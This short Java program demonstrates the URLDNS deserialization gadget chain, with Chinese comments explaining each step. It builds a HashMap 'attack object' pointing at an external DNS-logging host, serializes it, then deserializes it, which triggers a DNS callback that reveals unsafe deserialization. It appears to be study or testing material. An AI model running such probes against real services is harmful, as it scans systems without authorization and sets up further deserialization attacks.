package serialize;
import urldns.Payload;
import java.util.HashMap;

public class Main {
    public static void main(String[] args) throws Exception {
        //通过URLDNS的Payload类获取到hashmap攻击对象
        HashMap ht = Payload.getObject("http://pwn.464d0f707ed84b57c55a.d.zhack.ca");
        //获取序列化工具类
        Tool ser = new Tool(ht);
        //将对象进行序列化
        byte[] serialilzeData = ser.serialize();
        //将序列化数据进行反序列化
        HashMap ht2 = (HashMap)ser.unserialize(serialilzeData);
    }
}
